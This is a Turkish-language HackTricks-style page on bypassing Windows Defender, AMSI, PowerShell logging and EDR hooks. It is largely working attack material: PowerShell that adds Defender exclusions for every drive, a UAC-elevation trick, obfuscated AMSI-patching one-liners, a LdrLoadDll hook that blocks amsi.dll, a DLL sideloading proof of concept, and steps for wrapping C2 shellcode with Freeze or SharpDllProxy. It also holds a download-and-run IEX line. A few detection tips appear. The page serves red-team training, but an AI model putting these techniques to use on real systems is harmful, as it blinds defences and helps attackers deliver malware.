# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p) **tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için kullanılan bir tool.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için kullanılan bir tool.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce installer tarzı UAC tuzağı

Oyun hileleri gibi görünen public loader'lar genellikle imzasız Node.js/Nexe installer'ları olarak dağıtılır; bunlar önce **kullanıcıdan yetki yükseltme ister**, ardından Defender'ı devre dışı bırakır. Akış basittir:

1. `net session` ile yönetici bağlamını kontrol eder. Komut yalnızca çağrıyı yapan işlem yönetici haklarına sahip olduğunda başarılı olur; dolayısıyla başarısızlık, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal command line'ı koruyarak beklenen UAC onay istemini tetiklemek için `RunAs` fiiliyle kendisini hemen yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Mağdurlar zaten “cracked” yazılım yüklediklerine inandıkları için istem genellikle kabul edilir ve bu da malware'in Defender policy'sini değiştirmek için ihtiyaç duyduğu hakları elde etmesini sağlar.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` exclusions

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, service'i doğrudan devre dışı bırakmak yerine Defender'ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog'u (`taskkill /F /IM SecHealthUI.exe`) sonlandırır, ardından **son derece geniş exclusions** ekleyerek her user profile'ın, system directory'nin ve çıkarılabilir diskin taranamaz hale gelmesini sağlar:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) gezer; bu nedenle **diskin herhangi bir yerine bırakılacak gelecekteki tüm payload'lar yok sayılır**.
- `.sys` uzantısı istisnası ileriye dönüktür; saldırganlar, Defender'a yeniden dokunmadan daha sonra unsigned driver'ları yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden istisnaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender servisi durdurulmadığından, basit health check'ler “antivirus active” bildirmeye devam eder; ancak gerçek zamanlı denetim bu yollara hiçbir zaman erişmez.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Günümüzde AV'ler bir dosyanın malicious olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'lerde behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen malicious string'leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi (ör. dosya açıklaması, şirket adı, digital signature'lar, icon, checksum vb.) çıkararak gerçekleştirilir. Bu, bilinen public tool'ları kullanmanın yakalanmanızı kolaylaştırabileceği anlamına gelir; çünkü bunlar muhtemelen analiz edilmiş ve malicious olarak işaretlenmiştir. Bu tür detection yöntemini aşmanın birkaç yolu vardır:

- **Encryption**

Binary'yi encrypt ederseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini çözmek ve memory'de çalıştırmak için bir tür loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen binary veya script'inizdeki bazı string'leri değiştirmeniz, AV'yi geçmeniz için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı bir işlem olabilir.

- **Custom tooling**

Kendi tool'larınızı geliştirirseniz bilinen bad signature'lar bulunmaz; ancak bu, çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın static detection özelliğine karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz. Bu araç temel olarak dosyayı birden fazla segmente böler ve ardından Defender'dan her birini ayrı ayrı scan etmesini ister; bu şekilde binary'nizde hangi string veya byte'ların işaretlendiğini tam olarak görebilirsiniz.

Practical AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'ine göz atmanızı şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox içinde çalıştırıp malicious activity'yi izlemesidir (ör. browser'ınızın password'lerini decrypt edip okumaya çalışma, LSASS üzerinde minidump gerçekleştirme vb.). Bu bölüm üzerinde çalışmak biraz daha zor olabilir; ancak sandbox'ları evade etmek için yapabileceğiniz bazı şeyler şunlardır:

- **Sleep before execution** Nasıl implement edildiğine bağlı olarak bu, AV'nin dynamic analysis'ini bypass etmek için harika bir yöntem olabilir. AV'lerin, kullanıcının workflow'unu kesintiye uğratmamak için dosyaları scan etmek adına çok kısa bir zamanı vardır; bu nedenle uzun sleep'ler binary'lerin analizini engelleyebilir. Sorun şu ki birçok AV sandbox'ı, implementasyon şekline bağlı olarak sleep'i atlayabilir.
- **Checking machine's resources** Genellikle sandbox'ların kullanabileceği resource'lar çok sınırlıdır (ör. < 2GB RAM); aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU'nun sıcaklığını veya fan hızlarını kontrol edebilirsiniz. Sandbox'ta her şey implement edilmemiş olabilir.
- **Machine-specific checks** "contoso.local" domain'ine katılmış bir workstation'ı hedeflemek istiyorsanız bilgisayarın domain'ini kontrol ederek belirttiğiniz domain ile eşleşip eşleşmediğini görebilirsiniz; eşleşmiyorsa programınızın çıkmasını sağlayabilirsiniz.

Microsoft Defender's Sandbox computername'inin HAL9TH olduğu ortaya çıktı; bu nedenle detonation öncesinde malware'inizde computer name'i kontrol edebilirsiniz. İsim HAL9TH ile eşleşiyorsa Defender's sandbox'ın içindesiniz demektir; bu durumda programınızın çıkmasını sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes'a karşı kullanılabilecek [@mgeeky](https://twitter.com/mariuszbit)'den bazı diğer gerçekten iyi ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu post'ta daha önce söylediğimiz gibi **public tool'lar** sonunda **detected olur**; bu nedenle kendinize şu soruyu sormalısınız:

Örneğin LSASS dump'lamak istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump'layan farklı bir project kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. mimikatz'ı örnek alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok flag'lenen malware'lerden biridir. Project'in kendisi çok iyi olsa da AV'leri aşmak için onunla çalışmak bir nightmare olabilir; bu nedenle gerçekleştirmeye çalıştığınız işlem için alternatifler arayın.

> [!TIP]
> Payload'larınızı evasion amacıyla değiştirirken Defender'da **automatic sample submission'ı kapattığınızdan** emin olun ve lütfen, uzun vadede evasion elde etmek istiyorsanız **VIRUSTOTAL'A UPLOAD ETMEYİN**. Payload'ınızın belirli bir AV tarafından detected edilip edilmediğini kontrol etmek istiyorsanız bu AV'yi bir VM'ye install edin, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**; deneyimlerime göre DLL dosyaları genellikle **çok daha az detected olur** ve analiz edilir. Bu nedenle, payload'ınızın DLL olarak çalıştırılabilecek bir yöntemi varsa bazı durumlarda detection'dan kaçınmak için kullanabileceğiniz çok basit bir trick'tir.

Bu image'da görebileceğiniz gibi Havoc'tan bir DLL Payload, antiscan.me üzerinde 4/26 detection rate'e sahipken EXE payload'ın detection rate'i 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyalarıyla kullanabileceğiniz ve çok daha stealthier olmanızı sağlayacak bazı trick'leri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, hem victim application'ı hem de malicious payload(lar)ı yan yana konumlandırarak loader tarafından kullanılan DLL search order'dan yararlanır.

DLL Sideloading'e susceptible program'ları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, `"C:\Program Files\\"` içindeki DLL hijacking'e açık programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılar.

**DLL Hijackable/Sideloadable programs**'ı kendiniz **explore etmenizi** şiddetle tavsiye ederim; bu teknik doğru şekilde uygulandığında oldukça stealthy'dir, ancak publicly known DLL Sideloadable programs kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği ada sahip malicious bir DLL yerleştirmek payload'unuzu çalıştırmaz; çünkü program bu DLL'in içinde belirli functions bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve malicious) DLL'e yaptığı çağrıları original DLL'e yönlendirir; böylece programın işlevselliğini korurken payload'unuzun çalıştırılmasını da sağlar.

[ @flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş shellcode'umuzun hem de proxy DLL'in [antiscan.me](https://antiscan.me) üzerindeki tespit oranı 0/26! Buna başarılı diyebiliriz.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)'unu ve ayrıca ele aldığımız konuları daha derinlemesine öğrenmek için [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)'sunu **kesinlikle** izlemenizi öneririm.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan işlevleri export edebilir: export girdisi kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağıran export'u çözdüğünde Windows loader:

- `TargetDll` henüz yüklenmemişse onu yükler
- `TargetFunc`'ı ondan çözer

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward çözümlemesini yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: bir non-KnownDLL modül adına forward edilmiş bir function export eden imzalı bir DLL bulunur, ardından bu imzalı DLL, forward edilen hedef modül ile tam olarak aynı ada sahip attacker-controlled bir DLL ile aynı konuma yerleştirilir. Forwarded export çağrıldığında loader forward'ı çözer ve DLL'inizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (copy-paste):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütmeyi sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İletmeyi imzalı bir LOLBin ile tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` dosyasını (signed) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` öğesine yapılan forward işlemini takip eder
- loader daha sonra `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatasını yalnızca `DllMain` zaten çalıştırıldıktan sonra alırsınız

Hunting ipuçları:
- Hedef module bir KnownDLL olmadığında forwarded exports öğelerine odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded exports öğelerini şu araçları kullanarak enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma fikirleri:
- LOLBins'in (ör. `rundll32.exe`) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı temel ada sahip KnownDLLs dışı DLL'leri bu dizinden yüklemesini izleyin
- Şu işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollar altındaki `NCRYPTPROV.dll`
- Code integrity policies (WDAC/AppLocker) uygulayın ve application dizinlerinde write+execute işlemlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion yalnızca bir kedi-fare oyunudur; bugün çalışan bir şey yarın tespit edilebilir. Bu nedenle hiçbir zaman yalnızca tek bir araca güvenmeyin, mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR'ler genellikle `ntdll.dll` syscall stub'larına **user-mode inline hook** yerleştirir. Bu hook'ları bypass etmek için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'i çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: Oluşturulan stub içine bir `syscall`/`sysenter`/`SVC #0` instruction'ı yerleştirir (`ntdll` export'una erişilmez).
- **Indirect**: Kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrı için bir pool içinden gadget seçer.
- **Egg-hunt**: Statik `0F 05` opcode sequence'ını diske gömmekten kaçınır; bir syscall sequence'ını runtime sırasında çözümler.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: Stub byte'larını okumak yerine syscall stub'larını virtual address'e göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, SSN'leri dosyanın `.text` bölümünden okur ve ardından eşlemeyi kaldırır (bellekteki tüm hook'ları bypass eder).
- **RecycledGate**: VA-sorted SSN inference'ı, stub temiz olduğunda opcode validation ile birleştirir; hook varsa VA inference'a geri döner.
- **HW Breakpoint**: `syscall` instruction'ı üzerine DR0 yerleştirir ve hook'lanmış byte'ları parse etmeden runtime sırasında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" saldırılarını önlemek amacıyla oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları herhangi bir şekilde **doğrudan bellekte** çalıştırabilirseniz AV bunu önlemek için hiçbir şey yapamıyordu, çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için elevation)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA macro'ları

Antivirus çözümlerinin script içeriklerini hem şifrelenmemiş hem de obfuscation uygulanmamış biçimde sunarak script davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırıldığında Windows Defender'da aşağıdaki alert oluşur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` ifadesini ve ardından script'in çalıştığı executable'ın path'ini eklediğine dikkat edin; bu örnekte executable powershell.exe'dir.

Diske herhangi bir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca **.NET 4.8** ile birlikte C# kodu da AMSI üzerinden çalıştırılır. Bu durum, bellekte execution gerçekleştirmek için `Assembly.Load(byte[])` kullanıldığında da geçerlidir. Bu nedenle, AMSI'dan kaçınmak amacıyla bellekte execution için daha düşük .NET sürümlerinin (4.7.2 veya altı gibi) kullanılması önerilir.

AMSI'ı aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI temel olarak static detection'larla çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek detection'dan kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmana sahip olsalar bile script'lerdeki obfuscation'ı kaldırabilir; bu nedenle obfuscation, nasıl uygulandığına bağlı olarak kötü bir seçenek olabilir. Bu durum AMSI'dan kaçınmayı çok da straightforward olmayan bir işlem hâline getirir. Bununla birlikte bazen yalnızca birkaç variable adını değiştirmeniz yeterli olur; dolayısıyla durum, bir şeyin ne ölçüde flag'lendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process'ine bir DLL yüklenerek uygulandığından, unprivileged bir user olarak çalışırken bile kolayca kurcalanabilir. AMSI implementasyonundaki bu flaw nedeniyle araştırmacılar AMSI scanning'den kaçınmak için birden fazla yöntem bulmuştur.

**Bir Hata Zorlamak**

AMSI initialization işleminin başarısız olmaya zorlanması (`amsiInitFailed`), mevcut process için hiçbir scan başlatılmamasını sağlar. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirmiştir.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tek gereken, mevcut powershell process'i için AMSI'yi kullanılamaz hâle getiren tek satırlık bir powershell code'uydu. Elbette bu satır AMSI tarafından da flag'lendi; dolayısıyla bu technique'i kullanabilmek için bazı değişiklikler gerekiyor.

Aşağıda, bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass bulunuyor.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedilmiştir ve amsi.dll içindeki (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu) "AmsiScanBuffer" fonksiyonunun adresini bulmayı ve bu adresi E_INVALIDARG kodunu döndürecek talimatlarla üzerine yazmayı içerir; bu şekilde gerçek taramanın sonucu 0 olarak döner ve bu da temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan başka birçok teknik de vardır; bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo'ya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklemesini engelleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut prosese yüklendikten sonra başlatılır. Sağlam ve dilden bağımsız bir bypass yöntemi, istenen modül `amsi.dll` olduğunda hata döndüren `ntdll!LdrLoadDll` üzerinde user-mode hook oluşturmaktır. Bunun sonucunda AMSI hiçbir zaman yüklenmez ve bu proses için hiçbir tarama gerçekleştirilmez.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loader'lar genelinde çalışır (aksi halde AMSI'yi yükleyecek her şey).
- Uzun command-line izlerinden kaçınmak için script'leri stdin üzerinden beslemeyle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
- LOLBins üzerinden çalıştırılan loader'larda kullanıldığı görülmüştür (ör. `regsvr32`, `DllRegisterServer`'ı çağırırken).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için script üretir.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da randomize edilmiş user-defined function, değişkenler ve karakter ifadeleri kullanarak ve signature'ı önlemek için PowerShell keyword'lerine random karakter büyük/küçük harf uygulayarak AMSI'yi bypass eden script üretir.

**Tespit edilen signature'ı kaldırma**

Mevcut process'in memory'sinden tespit edilen AMSI signature'ını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanabilirsiniz. Bu tool, mevcut process'in memory'sini AMSI signature'ı için tarar ve ardından signature'ı NOP instructions ile üzerine yazarak etkili bir şekilde memory'den kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** içinde bulabilirsiniz.

**PowerShell version 2 kullanın**
PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu özellik denetim ve sorun giderme amaçları için yararlı olabilir, ancak **tespitten kaçınmak isteyen saldırganlar için bir sorun oluşturabilir**.

PowerShell logging'i bypass etmek için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakma**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir tool kullanabilirsiniz.
- **PowerShell version 2 kullanma**: PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell session kullanma**: PowerShell'i `powershell.exe` başlatmadan barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` process'ine bağlı kontrollerden kaçınır, ancak AMSI, Script Block Logging veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz; kapsam runtime ve host implementasyonuna bağlıdır.


## Obfuscation

> [!TIP]
> Bazı obfuscation teknikleri verileri şifrelemeye dayanır. Bu da binary'nin entropy'sini artırarak AV'lerin ve EDR'lerin onu tespit etmesini kolaylaştırır. Buna dikkat edin ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı değerlendirin.

### ConfuserEx-Protected .NET Binaries Deobfuscating

ConfuserEx 2 (veya ticari fork'larını) kullanan malware'leri analiz ederken decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, daha sonra dnSpy veya ILSpy gibi tool'larda C#'a decompile edilebilecek **orijinale yakın bir IL'i** güvenilir şekilde **geri yükler**.<sup>[[10]](#references)</sup>

1. Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve şifresini *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'ını patch'leyerek herhangi bir değişikliğin binary'nin çökmesine neden olmasını sağlar. Şifrelenmiş metadata tablolarını bulmak, XOR key'lerini kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
